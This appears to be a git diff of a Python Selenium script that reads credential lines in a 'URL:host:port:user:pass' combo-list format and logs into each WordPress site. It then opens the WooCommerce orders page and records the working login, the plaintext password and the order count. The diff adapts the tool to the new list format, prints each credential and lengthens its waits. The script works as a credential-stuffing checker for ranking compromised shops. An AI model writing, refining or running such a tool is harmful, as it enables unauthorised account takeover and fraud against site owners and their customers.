@@ -12,9 +12,9 @@ import os
 import time
 
 op = Options()
-op.add_argument('--headless')
-op.add_argument('--no-sandbox')
-op.add_argument('--disable-dev-shm-usage')
+# op.add_argument('--headless')
+# op.add_argument('--no-sandbox')
+# op.add_argument('--disable-dev-shm-usage')
 driver = webdriver.Chrome(ChromeDriverManager().install(), options=op)
 output_path = "./output.txt"
 def main():
@@ -58,10 +58,10 @@ def scrapOneFile(input_path):
         output_file = open(output_path, 'a')
 
         for line in input_file:
-            oneline = line.strip().split(';')
-            username = oneline[0]
-            password = oneline[1]
-            url = oneline[2].split('|')[0].strip()
+            oneline = line.strip().split(':')
+            username = oneline[3].strip()
+            password = oneline[4].strip()
+            url = oneline[1].strip() + ":" + oneline[2].strip()
             resultOne = scrapOnePage(url, username, password)
             print(resultOne)
             result.append(resultOne)
@@ -72,35 +72,39 @@ def scrapOneFile(input_path):
         print("Unknown format file")
 
 def scrapOnePage(url, username, password):
+    print(url)
+    print(username, password)
     try:
         driver.get(url)
         # login
         usernameEl = driver.find_element(By.ID, 'user_login')
         if usernameEl != None:
             usernameEl.send_keys(username)
-            time.sleep(1)
+            time.sleep(2)
             passwordEl = driver.find_element(By.ID, "user_pass")
             if passwordEl != None:
                 passwordEl.send_keys(password)
-                time.sleep(1)
+                time.sleep(3)
                 passwordEl.send_keys(Keys.RETURN)
-                time.sleep(2)
+                time.sleep(5)
                 # //*[@id="wpbody-content"]/div[5]/ul/li[1]/a/span
-                driver.get(url + "/edit.php?post_type=shop_order")
-                time.sleep(2)
+                driver.get(url.replace('wp-login.php', 'wp-admin') + "/edit.php?post_type=shop_order")
+                time.sleep(10)
                 orderEl = driver.find_element(By.XPATH, '//*[@id="wpbody-content"]/div[5]/ul/li[1]/a/span')
                 if orderEl != None:
                     nOrders = orderEl.text.replace('(', '').replace(')', '')
+                    if nOrders == "":
+                        nOrders = "0"
                     driver.close()
-                    return username + ";" + password + ";" + url + " | Orders: " + nOrders + "\n"
+                    return "URL:" + url + ":" + username + ":" + password + " | Orders: " + nOrders + "\n"
                 driver.close()
-                return username + ";" + password + ";" + url + " | No orders page\n"
+                return "URL:" + url + ":" + username + ":" + password + " | No orders page\n"
             else:
-                return username + ";" + password + ";" + url + " | Invalid credential\n"
+                return "URL:" + url + ":" + username + ":" + password + " | Invalid credential\n"
         else:
-            return username + ";" + password + ";" + url + "| can not reach login page\n"
+            return "URL:" + url + ":" + username + ":" + password + "| can not reach login page\n"
     except:
-        return username + ";" + password + ";" + url + " | can not reach the site\n"
+        return "URL:" + url + ":" + username + ":" + password + " | can not reach the site\n"
 
 
 # Press the green button in the gutter to run the script.
